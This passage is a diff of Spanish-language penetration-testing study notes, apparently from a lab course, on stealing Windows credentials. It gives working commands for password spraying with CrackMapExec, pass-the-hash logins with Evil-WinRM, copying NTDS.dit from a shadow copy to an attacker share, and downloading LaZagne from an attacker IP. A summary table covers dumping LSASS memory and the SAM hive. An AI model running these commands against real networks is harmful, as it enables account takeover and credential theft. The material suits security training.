@@ -291,7 +291,7 @@ luid 1354581
 ```
 
 - MSV: **MSV** es un paquete de autenticación en Windows que **LSA** utiliza para validar los intentos de inicio de sesión contra la base de datos **SAM**. **Pypykatz** extrajo el **SID**, el **Nombre de usuario**, el **Dominio** e incluso los hashes de contraseñas **NT** y **SHA1** asociados con la sesión de inicio de sesión de la cuenta de usuario **bob** almacenada en la memoria del proceso **LSASS**. Esto será útil en la última etapa de nuestro ataque, que se cubre al final de esta sección.
-- WDIGEST: es un protocolo de autenticación antiguo habilitado por defecto en **Windows XP** - **Windows 8** y **Windows Server 2003** - **Windows Server 2012**. **LSASS** almacena en caché las credenciales utilizadas por **WDIGEST** en texto claro. Esto significa que, si nos encontramos atacando un sistema Windows con **WDIGEST** habilitado, lo más probable es que veamos una contraseña en texto claro. Los sistemas operativos Windows modernos tienen **WDIGEST** deshabilitado por defecto
+- _WDIGEST_: es un protocolo de autenticación antiguo habilitado por defecto en **Windows XP** - **Windows 8** y **Windows Server 2003** - **Windows Server 2012**. **LSASS** almacena en caché las credenciales utilizadas por **WDIGEST** en texto claro. Esto significa que, si nos encontramos atacando un sistema Windows con **WDIGEST** habilitado, lo más probable es que veamos una contraseña en texto claro. Los sistemas operativos Windows modernos tienen **WDIGEST** deshabilitado por defecto
 - **DPAPI**: API en **Windows** que cifra y descifra datos a nivel de usuario para aplicaciones de sistema y de terceros.
 - **Aplicaciones comunes que usan DPAPI**:
     
@@ -304,17 +304,143 @@ luid 1354581
     
 - **Módulo de escalamiento de privilegios en Windows**: Se cubren con mayor detalle las técnicas de ataque contra **DPAPI**.
 
+##### Creando una lista de usuarios personalizada
+
+Imaginemos que hemos hecho mediante OSINT una búsqueda a una empresa y hemos obtenido una lista de nombres. Podemos crear un txt con los nombres, para posteriormente usar una herramienta que automatice la generación de nombres en función de los que ya hemos puesto. Podemos usar [Username Anarchy](https://github.com/urbanadventurer/username-anarchy). 
+
+```shell-session
+amr251@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
+```
+
+Ahora que tenemos la lista, podríamos lanzar un ataque con crackmapexec, en conjunto con el protocolo SMB para enviar solicitudes de login:
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+```
+
+En este ejemplo, CrackMapExec está utilizando SMB para intentar iniciar sesión como el usuario (-u) _bwilliamson_ utilizando una lista de contraseñas (-p) que contiene contraseñas comúnmente usadas (/usr/share/wordlists/fasttrack.txt)
+
+##### Logs de evento del ataque
+
+![[Pasted image 20250423120408.png | 800]]
+
+Puede ser útil saber qué podría haber quedado atrás tras un ataque. Conocer esto puede hacer que nuestras recomendaciones de remediación sean más impactantes y valiosas para el cliente con el que estamos trabajando. En cualquier sistema operativo Windows, un administrador puede acceder al Visor de eventos y revisar los eventos de Seguridad para ver las acciones exactas que se registraron. Esto puede informar decisiones para implementar controles de seguridad más estrictos y asistir en cualquier investigación potencial que pueda estar involucrada tras una brecha de seguridad.
+
+##### Capturando NTDS.dir
+
+El servicio de directorio NT Directory Services (NTDS) es utilizado con Active Directory (AD) para localizar y organizar los recursos de la red. Recuerda que el archivo NTDS.dit se almacena en `%systemroot%/ntds` en los controladores de dominio dentro de un bosque. La extensión `.dit` significa "directory information tree" (árbol de información del directorio). Este archivo es la base de datos principal asociada con AD y almacena todos los nombres de usuario del dominio, los hashes de contraseñas y otra información crítica del esquema. Si este archivo puede ser capturado, podríamos comprometer potencialmente todas las cuentas del dominio, de manera similar a la técnica que cubrimos en la sección "Atacando SAM".
+
+**Conectando a un DC con Evil-WinRM**
+
+Usando las credenciales que hemos capturado:
+
+```shell-session
+amr251@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
+```
+
+**Comprobando membresía de grupo local**
+
+Una vez conectados, podemos ver qué privilegios tiene el usuario `bwilliamson`.
+
+```shell-session
+*Evil-WinRM* PS C:\> net localgroup
+```
+
+**Comprobando privilegios de la cuenta de usuario incluyendo el dominio**
+
+```shell-session
+*Evil-WinRM* PS C:\> net user bwilliamson
+```
+
+**Creación de una copia sombra de C:**
+
+Podemos utilizar el comando `vssadmin` para crear una copia sombra (VSS) del disco C: o del volumen que el administrador haya seleccionado al instalar Active Directory. Aunque C: es la ubicación predeterminada para el archivo NTDS.dit, es posible que se haya cambiado. VSS permite realizar copias de volúmenes en uso sin interrumpir el sistema, lo que es útil para realizar copias de seguridad o para obtener acceso a archivos como NTDS.dit.
+
+```shell-session
+*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
+
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+```
+
+Podemos copiar NTDS.dit desde el VSS en otra localización para luego moverla a nuestro host de atacante
+
+```shell-session
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+        1 file(s) copied.
+
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
+    
+```
+
+Aunque hay otro método más rápido, que es usar `cme` para capturar NTDS.dit. 
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+```
+
+Si no conseguimos romper un hash, podemos considerar el método Pass-The-Hash, que se aprovecha del protocolo NTLM para autenticar un usuario teniendo únicamente el hash, en vez de username:password en texto claro:
+
+```shell-session
+amr251@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+```
+
+##### Usando Lazagne
+
+[Lazagne](https://github.com/AlessandroZ/LaZagne) es una herramienta que nos permite descubrir rápidamente credenciales que algunos navegadores pueden guardar de forma insegura. Sería adecuado mantener una copia standalone de Lazagne en nuestro host de atacante para poder transferirlo a la víctima. Para ello podemos montar en nuestro host de atacante un servidor local con python y desde PowerShell:
+
+```powershell
+iwr -uri http://<IP_ATACANTE>:8080/LaZagne.exe -outfile LaZagne.exe
+```
+
+```cmd-session
+C:\Users\bob\Desktop> start lazagne.exe all
+```
+
+```cmd-session
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+
+########## User: bob ##########
+
+------------------- Winscp passwords -----------------
+
+[+] Password found !!!
+URL: 10.129.202.51
+Login: admin
+Password: SteveisReallyCool123
+Port: 22
+```
+
+##### Usando findstr
+
+También podemos usar [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) para buscar patrones entre muchos archivos, para encontrar contraseñas por ejemplo:
+
+```cmd-session
+C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
 ## Resumen
 
-|**Comando**|**Descripción**|
-|---|---|
-|`tasklist /svc`|Utilidad basada en línea de comandos en Windows utilizada para listar los procesos en ejecución.|
-|`findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`|Utiliza la utilidad basada en línea de comandos `findstr` para buscar la cadena "password" en diferentes tipos de archivos.|
-|`Get-Process lsass`|Cmdlet de PowerShell utilizado para mostrar información sobre los procesos. Usarlo con el proceso **LSASS** puede ser útil al intentar volcar la memoria del proceso LSASS desde la línea de comandos.|
-|`rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`|Utiliza **rundll32** en Windows para crear un archivo de volcado de memoria de LSASS. Este archivo puede ser transferido a un host de ataque para extraer credenciales.|
-|`pypykatz lsa minidump /path/to/lsassdumpfile`|Utiliza **Pypykatz** para analizar e intentar extraer credenciales y hashes de contraseñas de un archivo de volcado de memoria de LSASS.|
-|`reg.exe save hklm\sam C:\sam.save`|Utiliza **reg.exe** en Windows para guardar una copia de una colmena del registro en una ubicación específica del sistema de archivos. Puede usarse para hacer copias de cualquier colmena del registro (por ejemplo, **hklm\sam**, **hklm\security**, **hklm\system**).|
-|`move sam.save \\<ip>\NameofFileShare`|Utiliza **move** en Windows para transferir un archivo a un recurso compartido de archivos especificado a través de la red.|
-|`python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`|Utiliza **Secretsdump.py** para volcar los hashes de contraseñas desde la base de datos **SAM**.|
-|`vssadmin CREATE SHADOW /For=C:`|Utiliza la herramienta basada en línea de comandos **vssadmin** de Windows para crear una copia sombra del volumen `C:`. Esto puede usarse para hacer una copia segura de **NTDS.dit**.|
-|`cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`|Utiliza la herramienta basada en línea de comandos **copy** de Windows para crear una copia de **NTDS.dit** a partir de una copia sombra del volumen `C:`.|
+| **Comando**                                                                                              | **Descripción**                                                                                                                                                                                                                                                          |
+| -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `tasklist /svc`                                                                                          | Utilidad basada en línea de comandos en Windows utilizada para listar los procesos en ejecución.                                                                                                                                                                         |
+| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`                          | Utiliza la utilidad basada en línea de comandos `findstr` para buscar la cadena "password" en diferentes tipos de archivos.                                                                                                                                              |
+| `Get-Process lsass`                                                                                      | Cmdlet de PowerShell utilizado para mostrar información sobre los procesos. Usarlo con el proceso **LSASS** puede ser útil al intentar volcar la memoria del proceso LSASS desde la línea de comandos.                                                                   |
+| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`                               | Utiliza **rundll32** en Windows para crear un archivo de volcado de memoria de LSASS. Este archivo puede ser transferido a un host de ataque para extraer credenciales.                                                                                                  |
+| `pypykatz lsa minidump /path/to/lsassdumpfile`                                                           | Utiliza **Pypykatz** para analizar e intentar extraer credenciales y hashes de contraseñas de un archivo de volcado de memoria de LSASS.                                                                                                                                 |
+| `reg.exe save hklm\sam C:\sam.save`                                                                      | Utiliza **reg.exe** en Windows para guardar una copia de una colmena del registro en una ubicación específica del sistema de archivos. Puede usarse para hacer copias de cualquier colmena del registro (por ejemplo, **hklm\sam**, **hklm\security**, **hklm\system**). |
+| `move sam.save \\<ip>\NameofFileShare`                                                                   | Utiliza **move** en Windows para transferir un archivo a un recurso compartido de archivos especificado a través de la red.                                                                                                                                              |
+| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`                 | Utiliza **Secretsdump.py** para volcar los hashes de contraseñas desde la base de datos **SAM**.                                                                                                                                                                         |
+| `vssadmin CREATE SHADOW /For=C:`                                                                         | Utiliza la herramienta basada en línea de comandos **vssadmin** de Windows para crear una copia sombra del volumen `C:`. Esto puede usarse para hacer una copia segura de **NTDS.dit**.                                                                                  |
+| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Utiliza la herramienta basada en línea de comandos **copy** de Windows para crear una copia de **NTDS.dit** a partir de una copia sombra del volumen `C:`.                                                                                                               |
